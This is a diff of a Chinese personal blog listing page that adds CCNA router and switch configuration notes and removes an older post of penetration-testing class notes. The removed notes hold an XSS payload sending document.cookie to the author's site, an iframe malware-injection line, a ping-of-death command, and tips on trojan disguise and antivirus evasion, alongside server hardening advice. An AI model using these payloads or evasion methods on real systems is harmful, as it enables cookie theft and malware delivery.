@@ -75,6 +75,344 @@
     <div class="outer">
       <section id="main">
   
+    <article id="post-CCNA" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/23/CCNA/" class="article-date">
+  <time datetime="2017-09-23T11:48:28.000Z" itemprop="datePublished">2017-09-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/网络/">网络</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/23/CCNA/">CCNA</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <!-- Table of Contents -->
+      
+        <h1 id="简单的流量操控"><a href="#简单的流量操控" class="headerlink" title="简单的流量操控"></a>简单的流量操控</h1><p>ACL 访问能控制链表 工作在在网络层和传输层</p>
+<ul>
+<li><p>标准acl 针对源ip 应用在接口之下，在每个接口针对每个方向的流量套用的acl只能用        一个</p>
+<ul>
+<li><p>配置：</p>
+<pre><code>/*数字编号*/
+ acc X(1-99) deny 源ip 反掩码
+ int X(接口编号)
+ ip acc X out/int
+  /*命名*/
+ ip acc standard X（名字）deny 源ip 反掩码
+</code></pre></li>
+</ul>
+</li>
+<li><p>扩展acl 针对协议（传输层，网络层），源ip，目的ip，端口号</p>
+<ul>
+<li><p>配置：</p>
+<pre><code>/*数字编号*/
+ acc X(100-199) deny 协议 源ip 反掩码 目的ip/目的网段 反掩码 端口号
+ acc X(100-199) deny 协议 源ip 反掩码 host 主机ip  端口号
+ acc X permit any any            
+  /*命名*/
+ ip acc extend X（名字）
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>不管是何种acl最后都会存在一条拒绝所有数据的命令，一般都会在结尾加上一条放行所有命令行 </p>
+<pre><code>acc X permint any
+</code></pre><p>acl顺序不可调整 </p>
+</li>
+<li><p>删除</p>
+<pre><code>no acc X
+</code></pre></li>
+<li><p>奇偶</p>
+<pre><code>奇数acc 1 per 172.16.1.0 0.0.254.255
+偶数acc 1 per 172.16.0.0 0.0.254.255
+</code></pre></li>
+</ul>
+<h1 id="远程登录-telnet"><a href="#远程登录-telnet" class="headerlink" title="远程登录 telnet"></a>远程登录 telnet</h1><p>端口号：23  ，要求ping的通</p>
+<pre><code>line vty 0 4 //0表示line从0开始，4表示一共有5个可供登录的单位
+
+password X
+</code></pre><p>同时配置，密文优先生效</p>
+<h1 id="nat：地址转换协议"><a href="#nat：地址转换协议" class="headerlink" title="nat：地址转换协议"></a>nat：地址转换协议</h1><p>进行地址转换，可将私网地址转成公网地址进行通讯，提升了ip地址空间的使用率</p>
+<ul>
+<li>内部本地地址：内部主机所获得的私网地址</li>
+<li><p>内部全局地址：转换成的公网地址</p>
+<ul>
+<li><p>配置方式</p>
+<p>  一对一：静态的手动指定</p>
+<ol>
+<li><p>定义接口角色：</p>
+<pre><code>int e0/0
+ip nat inside
+
+int e0/1
+ip nat outside
+</code></pre></li>
+<li><p>进行地址映射的配置</p>
+<pre><code>ip nat inside source static 私网内地址 公网出接口地址
+</code></pre><p>多对多：动态的</p>
+</li>
+<li><p>定义接口角色</p>
+</li>
+<li><p>定义抓取要转换的流量</p>
+<pre><code>acc 1 per 要转换的ip 反掩码8
+</code></pre></li>
+<li><p>定义转换后的地址</p>
+<pre><code>ip nat pool ?（名字） 转换后的地址 netmask 子网掩码        
+</code></pre></li>
+<li><p>进行地址映射</p>
+<pre><code>ip nat inside source list 1 pool ccnp
+</code></pre><p>多对一：（目前用的最多的）端口号：区分主机</p>
+</li>
+<li><p>定义接口角色</p>
+</li>
+<li><p>定义要转换的地址流量</p>
+</li>
+<li><p>进行地址映射</p>
+<pre><code>ip nat inside source list 1 int e0/0 overload  // e/0/0为出接口
+</code></pre></li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h1><p>子接口： 将一个物理接口逻辑上划分成多个子接口使用，每一个划分出来的子接口和物理接口一样正常使用</p>
+<pre><code>进入接口
+no sh
+int e0/0.X
+en dot1q X(所要识别的标记)
+</code></pre><h1 id="stp生成树协议"><a href="#stp生成树协议" class="headerlink" title="stp生成树协议"></a>stp生成树协议</h1><p>路由器单点故障（冗余）</p>
+<ol>
+<li>广播风暴</li>
+<li>重复帧</li>
+<li><p>mac地址表的不稳定</p>
+<p> 解决方法：</p>
+<ol>
+<li>一个网络中选取一个根桥</li>
+<li>根桥上所有端口都为指定端口</li>
+<li>非根桥上选举一个根端口</li>
+<li>每一段选取一个指定端口</li>
+<li>非指定端口为阻塞端口</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li>bpdu：桥协议数据单元 （只允许根桥产生，不允许非根桥产生，毎2s发送一次，维护本生成树的运行）<ol>
+<li>root id   = 优先级（默认为32768，越小越优，更改优先级时，优先级必须为4096的倍数 + 插进vlan信息数值） + 背板mac（表示交换机，越小越优）</li>
+<li>桥id （发送者桥id） = 优先级 + 背板mac，设置与root id一样</li>
+<li>cost</li>
+<li>port id  = 优先级（默认为128，越小越优，更改时必须为64的倍数） + 端口mac（发送者的端口mac）</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li><p>pvst 毎vlan生成树</p>
+<p>  若20s内没有收到bpdu信息则交换机将所有端口置于listen状态，<br>  tcn bpdu ：拓扑变更信息，从跟端口向上转发，根桥回复ack确认信息，由根桥向下所有人发送信息，全部重选</p>
+<ol>
+<li>block</li>
+<li>init 初始化</li>
+<li>listen 15s过后切入learn</li>
+<li>learn  学习mac地址，完善mac地址表，15s后切入forword状态</li>
+<li>forword</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li><p>端口</p>
+<ul>
+<li>指定端口：可以执行数据的转发，一台交换机上可以有多个指定端口（除跟端口和阻塞端口外，其余端口所有端口都为指定端口，根桥上所有端口都为指定端口）</li>
+<li>根端口（只在非根桥上选举，并且只选以一个，为距离根桥路径最短的端口）</li>
+<li><p>阻塞端口：逻辑上的阻塞，不执行数据的转发，但会持续侦听bpdu更新</p>
+<pre><code>sh spanning sum
+sh spa sum root port //查看谁是根
+sh spa 
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<pre><code>span vlan 1,3,5,7,9 pri X（优先级值）
+
+span vlan 1,3,5,7,9 root X（pri（主根）/sec（副根））（所有交换机优先级大于4096才可执行）
+</code></pre><ul>
+<li><p>rstp 快速vlan生成树</p>
+<ul>
+<li><p>端口：</p>
+<ol>
+<li>根端口</li>
+<li>指定端口</li>
+<li>阻塞端口</li>
+<li>替代端口：替代根端口，从指定端口中选取</li>
+<li>备份端口：备份的指定端口，从阻塞端口中选取</li>
+</ol>
+</li>
+<li><p>状态：</p>
+<ol>
+<li>dis   丢弃状态： 周期性向外发送bpdu信息</li>
+<li>learning  学习状态  一边侦听一边学习</li>
+<li>forword  转发</li>
+</ol>
+</li>
+<li><p>协商/同意机制</p>
+<pre><code>特权模式下
+spa mo rapid
+</code></pre></li>
+</ul>
+</li>
+<li><p>mst </p>
+<p>  自动开启快速生成树（对快速生成树配置的优化），<br>  对vlan进行分组，一个组叫做一个实例（默认实例0）</p>
+<pre><code>span mo mst 
+span mst con
+ins X(实例编号) vlan 1,2,3,4,5,6
+</code></pre></li>
+<li><p>portfast 快速端口/边缘端口</p>
+<p>  将端口设为快速端口不参与生成树的选举之间进入到转发状态<br>  全局模式下</p>
+<pre><code>spa port def //将交换机上所有端口都置于快速端口
+
+接口下
+spa port  //针对单一的接口开启
+</code></pre></li>
+<li><p>bpdu guard  bpdu保护</p>
+<p>  置于快速的端口，若收到bpdu信息立马关闭，且必须管理员手动恢复（先sh，再no sh）</p>
+<pre><code>全局模式下
+spa por bpdug def
+
+接口下
+sw port mac-add mac地址    //绑定终端地址
+</code></pre></li>
+</ul>
+<ul>
+<li><p>接口角色</p>
+<ul>
+<li>inside：连接在内部广播域</li>
+<li>outside：连接公网</li>
+<li><p>配置：</p>
+<pre><code>1.定义接口角色：
+    int e0/0
+    ip nat inside
+
+    int e0/1
+    ip nat outside
+2.进行地址映射的配置
+    ip nat inside source static 私网内地址 公网出接口地址
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h1 id="DHCP：动态主机ip地址获得协议"><a href="#DHCP：动态主机ip地址获得协议" class="headerlink" title="DHCP：动态主机ip地址获得协议"></a>DHCP：动态主机ip地址获得协议</h1><pre><code>ip dhcp pool x（名字） 
+network 地址段    //宣告将要分配的地址段
+default-router 网关路由器地址
+
+ip dhcp excluded-add //不向外分配的ip地址
+
+/*指定分配ip*/
+路由器上
+ip dhcp pool X(名字)
+host 将要分配的地址 子网掩码
+def-ro 网关路由地址
+client-iden 01mac地址（小数点向前移2位）
+
+在主机上
+int e0/0
+ip add dhcp client-id e0/0
+</code></pre><ul>
+<li><p>dhcp中继</p>
+<p>  由中继路由器收到的rarp广播请求发给dhcp服务器</p>
+<pre><code>中继路由器上
+ip help- add dhcp服务器地址
+</code></pre></li>
+<li><p>arp绑定</p>
+<pre><code>arp 主机ip mac地址 arpa    
+</code></pre></li>
+</ul>
+<h1 id="网关冗余协议"><a href="#网关冗余协议" class="headerlink" title="网关冗余协议"></a>网关冗余协议</h1><ul>
+<li><p>GLBP</p>
+<ul>
+<li>思科私有，一个组最多可以有4台路由器</li>
+<li>虚拟网关所对应的虚拟mac 0007.b400b.02xx </li>
+<li>AVF：虚拟转发者</li>
+<li>AVG：网关管理者，分配由哪一台路由器去承载该数据流量</li>
+<li>优先级：默认100 越大越优</li>
+<li><p>接口ip地址：越大越优</p>
+<pre><code>sh gl bri
+int e0/0
+glbp X（组号） ip 虚拟网关ip地址 
+
+glbp 1 pre  //开启抢占功能（所有路由器）
+
+glbp 1 pri X（优先级）
+
+glbp 1 load-bal round-robin(默认，依次)/host（固定的主机定向，固定线路）/wei（按比例分配流量）
+glbp 1 wei X
+</code></pre></li>
+</ul>
+</li>
+<li><p>HSRP</p>
+<ul>
+<li>一个组中最多可以有12台路由器，组多只有一台转发，其他都为备份</li>
+<li>虚拟网关ip所对应的虚拟mac 0000.0c07.acxx (xx为组号)</li>
+<li>active：实际转发者</li>
+<li>standby：备份路由器</li>
+<li>优先级：默认100 越大越优</li>
+<li><p>接口ip地址：越大越优</p>
+<pre><code>standby X（组号） 虚拟网关
+standby X pree  //开启抢占功能
+standby X pri X（优先级）
+sh sta bri
+sta X tr 接口号 X（处罚值，当接口断开后从优先级上剪掉处罚值） //追踪接口
+</code></pre></li>
+</ul>
+</li>
+<li><p>VRRP    </p>
+<p>  对应的虚拟mac 0000.5e00.01xx</p>
+</li>
+<li><p>接口状态：</p>
+<ul>
+<li>down：没有开启网关冗余协议协议</li>
+<li>init：已开启，发送hello信息包</li>
+<li>learn：开启网关冗余，但是没有设置虚拟ip，学习同组虚拟ip</li>
+<li>listen：侦听hello信息包进行角色竞选</li>
+<li>standby：持续侦听hello信息，一边确定网络中的active路由器是否还在，他的竞选参数跟本地相比是否更优</li>
+<li>active：正常接收数据，转发，同时周期性的发送hello信息通告本地的存活状态及参数，毎2s发一次</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="http://dmonster.top/2017/09/23/CCNA/" data-id="cjkjfl7i7000am0ugwd3z2349" class="article-share-link" data-share="baidu" data-title="CCNA">分享到</a>
+      
+
+      
+        <a href="http://dmonster.top/2017/09/23/CCNA/#ds-thread" class="article-comment-link">评论</a>
+      
+
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CCNA/">CCNA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/笔记/">笔记</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-NA测试题小综合" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2017/09/10/NA测试题小综合/" class="article-date">
@@ -1950,318 +2288,10 @@ regex.sub(r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到 (213)
 
 
   
-    <article id="post-网络渗透与深度防御笔记" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/04/06/网络渗透与深度防御笔记/" class="article-date">
-  <time datetime="2017-04-06T07:15:45.000Z" itemprop="datePublished">2017-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/安全/">安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/04/06/网络渗透与深度防御笔记/">网络渗透与深度防御笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-      <!-- Table of Contents -->
-      
-        <h1 id="翻墙："><a href="#翻墙：" class="headerlink" title="翻墙："></a>翻墙：</h1><pre><code>1. 免费代理服务器（工具——internet选项——连接——局域网设置）
-2. 肉机
-3. 2次vpn（91vpn）
-</code></pre><h1 id="入侵还原："><a href="#入侵还原：" class="headerlink" title="入侵还原："></a>入侵还原：</h1><pre><code>- 利用漏洞
-</code></pre><h1 id="攻击方法："><a href="#攻击方法：" class="headerlink" title="攻击方法："></a>攻击方法：</h1><ul>
-<li><p>溢出攻击：栈，堆。</p>
-<ol>
-<li>远程溢出：溢出工具+对方服务器ip+cmdshell   （ms12-020：3389）</li>
-<li>本地溢出：  程序——提权（ser-u ，360）<ul>
-<li>自动更新：已公布的 后门</li>
-</ul>
-</li>
-</ol>
-</li>
-<li><p>汇编语言：</p>
-<ul>
-<li>漏洞挖掘 破解分析</li>
-</ul>
-</li>
-<li><p>防御：</p>
-<ul>
-<li>安全编码，输入参数过滤</li>
-</ul>
-</li>
-<li><p>邮件攻击：  </p>
-<ol>
-<li>密码破解：字典</li>
-<li>垃圾邮件——炸蛋——系统stop</li>
-<li>邮件钓鱼：链接（美女 特价 附马邮件（以纯文本方式安全打开））</li>
-<li>伪装发件人：1和l，0和O，4和A</li>
-<li>表单钓鱼：提交信息——网页生成文件或发送信息至黑客邮箱</li>
-<li>邮箱跨站：hotmail， gmail，yahoo，139，sina</li>
-</ol>
-</li>
-<li><p>手机攻击：   </p>
-<ol>
-<li>IOS诊断有后门 </li>
-<li>手机远程控制：微信，陌陌，通话环境录音，通讯录，照片</li>
-<li>伪基站</li>
-<li>sim卡复制</li>
-<li>“呼死你”k8——1000呼|短信</li>
-</ol>
-</li>
-<li><p>网银攻击：</p>
-<ul>
-<li>浮云木马，在线劫持，网银大盗，银行卡复制，u盾：高级克隆（硬对硬复制） </li>
-</ul>
-</li>
-<li><p>逻辑漏洞：</p>
-<ul>
-<li>表示逻辑  </li>
-<li>业务逻辑  </li>
-<li>访问逻辑</li>
-<li>例：id=xxxxxxx&amp;pass=xxxxxxxxxx</li>
-</ul>
-</li>
-<li><p>平行权限：</p>
-<ul>
-<li>网购：</li>
-<li>A：订单1101，</li>
-<li>B：订单=1101——删除</li>
-</ul>
-</li>
-<li><p>目录遍历：</p>
-<ul>
-<li>原因：浏览目录权限  </li>
-<li>baidu：  inurl；qq.txt<br>  index of /ppt    +pass/…………..<br>  index of /xls<br>  index of /data</li>
-</ul>
-</li>
-<li><p>密码获取： </p>
-<ol>
-<li>暴力破解：LC，SAMINSIDE</li>
-<li>肩窥</li>
-<li>中间人攻击</li>
-<li>siniffer 嗅探</li>
-<li>社会工程学</li>
-<li>星号密码克星     灵格斯翻译（划词功能）</li>
-<li>自动登录，记住密码 cookies欺骗 绕过验证</li>
-<li>数据库dv_log记录     </li>
-</ol>
-</li>
-<li><p>网络钓鱼：</p>
-<ul>
-<li><a href="http://www.taobao.com（url转码）（越长越要小心）" target="_blank" rel="noopener">www.taobao.com（url转码）（越长越要小心）</a></li>
-</ul>
-</li>
-<li><p>社会工程学：</p>
-<ul>
-<li>APT（持久性攻击）  </li>
-<li>改号软件  QQ（女孩）</li>
-<li>反向社工</li>
-</ul>
-</li>
-</ul>
-<h1 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h1><pre><code>1. access+asp
-2. mssql
-3. php+mysql
- 4. jsp+oracle（大型）
-
-1. 注入原因：程序对用户输入的字符没有过滤。
-2. 如何判断注入点：www.xxxx.com/a.asp（脚本）？id=1....    能执行语句
-3. 自动工具：domain   pangolin（穿山甲）   sqlmap    管中窥豹（穿waf：wab app fw）
-</code></pre><h1 id="xss跨站："><a href="#xss跨站：" class="headerlink" title="xss跨站："></a>xss跨站：</h1><ul>
-<li>挂马，盗cookies，xss盲打，dos，xss蠕虫，后台添加管理员</li>
-</ul>
-<h1 id="dos-ddos："><a href="#dos-ddos：" class="headerlink" title="dos/ddos："></a>dos/ddos：</h1><ul>
-<li><p>拒绝服务/分布式拒绝服务（世界难题）</p>
-</li>
-<li><p>挂马：</p>
-<ol>
-<li><p>内嵌式框架挂马</p>
-<pre><code>&lt;iframe src=http://(ip)/&gt; /&lt;//iframe/&gt;
-</code></pre></li>
-<li>数据库挂马</li>
-<li>定向挂马</li>
-<li>漏洞挂马：ie  暴风影音 360</li>
-</ol>
-</li>
-</ul>
-<h1 id="杀毒软件："><a href="#杀毒软件：" class="headerlink" title="杀毒软件："></a>杀毒软件：</h1><ul>
-<li>已知病毒：特征码</li>
-<li>未知病毒：主动防御——行为</li>
-<li>高启发——仿真</li>
-</ul>
-<h1 id="免杀："><a href="#免杀：" class="headerlink" title="免杀："></a>免杀：</h1><ul>
-<li>数字签名</li>
-<li>区段加密.加壳</li>
-</ul>
-<h1 id="四无："><a href="#四无：" class="headerlink" title="四无："></a>四无：</h1><ul>
-<li>无启动项，</li>
-<li>无端口，</li>
-<li>无进程，</li>
-<li>无磁盘文件（hook，硬件：bios cih）</li>
-</ul>
-<h1 id="WEB终极加固："><a href="#WEB终极加固：" class="headerlink" title="WEB终极加固："></a>WEB终极加固：</h1><ul>
-<li>iis：<ol>
-<li>修改默认日志的路径</li>
-<li>网站—属性—高级– ：协议版本，cookie<pre><code>（日志分析：splunk，biglog）
-</code></pre></li>
-<li>删除所有不必要的映射：扩展名：asp，html防止黑客上传其他扩展名文件<pre><code>主目录—配置—映射
-</code></pre></li>
-<li>向客户端发送以下信息：出错：110监控网站<pre><code>主目录—配置—映射
-</code></pre></li>
-<li>iis权限：不给写入，目录浏览</li>
-<li>限制后台登陆ip：登录后台地址：admin—右键—目录安全性—属性—允许：ip段</li>
-<li>删除所有自定义错误</li>
-</ol>
-</li>
-</ul>
-<ul>
-<li><p>数据库：</p>
-<ol>
-<li>禁止websever和数据库同台</li>
-<li>修改默认库及表的位置和名字</li>
-<li>认证：口令复杂，权限：行，列，数据库加密，日志审核</li>
-<li>防下载：数据库重定向主页</li>
-</ol>
-</li>
-<li><p>ntfs加固：终极防webshell：能写不能执行 能执行不能写</p>
-<ol>
-<li>删除所有默认权限</li>
-<li>添加administrator，完全控制</li>
-<li>添加iis—wpg：完全控制</li>
-<li>添加iusr—计算机名 （来宾）–只读</li>
-<li>确定那些需要写入权限：data，databackup，uploadfile，uploadface给来宾-写入</li>
-<li>给以上目录：拒接执行</li>
-</ol>
-</li>
-</ul>
-<h1 id="dos-ddos-拒绝服务-分布式拒绝服务"><a href="#dos-ddos-拒绝服务-分布式拒绝服务" class="headerlink" title="dos/ddos  拒绝服务/分布式拒绝服务"></a>dos/ddos  拒绝服务/分布式拒绝服务</h1><ul>
-<li><p>tcp三次握手   </p>
-<ul>
-<li>S-syn： 请求连接（1）</li>
-<li>F-fin ：结束连接（1）</li>
-<li>A-ack：确定 acknumber=对方seg+1</li>
-<li><p>R-rst：复位</p>
-<p>-发送方：syn=1, seg=100<br>-接收方：syn=1, ack=1, acknumber=101, seg=300<br>-发送方：       ack=1, acknumber=301, seg=100</p>
-</li>
-</ul>
-</li>
-<li><p>配置远程控制木马：</p>
-<ul>
-<li>灰鸽子，</li>
-<li>pcshare，</li>
-<li>魔术，</li>
-<li>波尔</li>
-</ul>
-<ol>
-<li>pcshare无限版：生成客户端：<br>  ip：域名：端口：808（没有被占用的端口）    </li>
-<li>穿墙 dll注入ie进程</li>
-<li>ping of death： ping ip -1 65500 –t</li>
-<li>阿拉丁</li>
-<li>cc攻击（snifferrpro）</li>
-</ol>
-</li>
-<li><p>会话劫持</p>
-<ul>
-<li>ip-mac：arp</li>
-<li>cmd：       <ul>
-<li>arp-a:显示本地arp缓存</li>
-<li>arp-d *：清除缓存</li>
-<li>arp-s：绑定</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li>安装CAIN，安装WINCAP</li>
-<li>运行CAIN ： <ul>
-<li>start sniffer 点网卡图标—host  空白区右键  sacn mac—-arp 点加号：左边：服务器ip，右边客户端ip</li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-<h1 id="Xss跨站（客户端）"><a href="#Xss跨站（客户端）" class="headerlink" title="Xss跨站（客户端）"></a>Xss跨站（客户端）</h1><ul>
-<li><p>所有输入点都是攻击源</p>
-<ol>
-<li><p>测试漏洞：</p>
-<pre><code>&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;
-</code></pre></li>
-<li>挂马：”&lt;iframe src=hettp//ip//a.js&gt;“</li>
-<li>盗cookis <ul>
-<li>例”<scrpt>document.location=’自己网站/cookies.asp?msg=’+document.cookie“</scrpt></li>
-<li>(在自己做的网站下放cookies。Asp文件用来获取盗取的cookies)</li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-<h1 id="木马的隐藏"><a href="#木马的隐藏" class="headerlink" title="木马的隐藏"></a>木马的隐藏</h1><ol>
-<li>Rar文件：创建自解压格式<pre><code>解压前：muma.exe
-解压后：qq.exe
-</code></pre></li>
-<li>伪装成图片和记事本的图标</li>
-<li>利用捆绑器：正常文件+木马</li>
-<li>源分发:源代码里有木马代码</li>
-<li>hook：钩子 ssdt.lnkine.fsd.fsdinline</li>
-<li>文件资源区</li>
-<li>进程守护</li>
-<li>dll注入进程</li>
-<li>dll本地劫持</li>
-</ol>
-<h1 id="手工杀马："><a href="#手工杀马：" class="headerlink" title="手工杀马："></a>手工杀马：</h1><ul>
-<li>Installrite：快照：snap1 snap2</li>
-<li>Avafind：硬盘快速索引</li>
-<li><p>进程管理工具</p>
-</li>
-<li><p>木马位置：</p>
-<ul>
-<li>查没有数字签名的进程文件cmd删除隐藏木马文件属性 ：</li>
-<li>/a显示隐藏，attrib  –s -r- h删除属性</li>
-</ul>
-</li>
-</ul>
-<h1 id="手工杀病毒："><a href="#手工杀病毒：" class="headerlink" title="手工杀病毒："></a>手工杀病毒：</h1><ul>
-<li>svchost。Exe位置</li>
-<li>将svchost。Exe加载到od-右键-查看字符串</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-        <a data-url="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/" data-id="cjkjfl7l6002hm0ugjn4seoi8" class="article-share-link" data-share="baidu" data-title="网络渗透与深度防御笔记">分享到</a>
-      
-
-      
-        <a href="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/#ds-thread" class="article-comment-link">评论</a>
-      
-
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/笔记/">笔记</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
   </nav>
 </section>
       
@@ -2271,7 +2301,7 @@ regex.sub(r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到 (213)
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nginx/">nginx</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python3/">python3</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络/">网络</a><span class="category-list-count">11</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nginx/">nginx</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python3/">python3</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络/">网络</a><span class="category-list-count">11</span></li></ul>
     </div>
   </div>
 
@@ -2280,7 +2310,7 @@ regex.sub(r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到 (213)
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCIE/">CCIE</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNA/">CCNA</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNP/">CCNP</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小玩意/">小玩意</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/笔记/">笔记</a><span class="tag-list-count">15</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCIE/">CCIE</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNA/">CCNA</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNP/">CCNP</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小玩意/">小玩意</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/笔记/">笔记</a><span class="tag-list-count">16</span></li></ul>
     </div>
   </div>
 
@@ -2289,7 +2319,7 @@ regex.sub(r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到 (213)
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">6</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">6</span></li></ul>
     </div>
   </div>
 
@@ -2299,6 +2329,10 @@ regex.sub(r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到 (213)
     <h3 class="widget-title">近期文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2018/08/07/mysql-binlog日志/">mysql binlog日志</a>
+          </li>
         
           <li>
             <a href="/2018/08/06/nginx搭建简易的文件服务器/">nginx搭建简易的文件服务器</a>
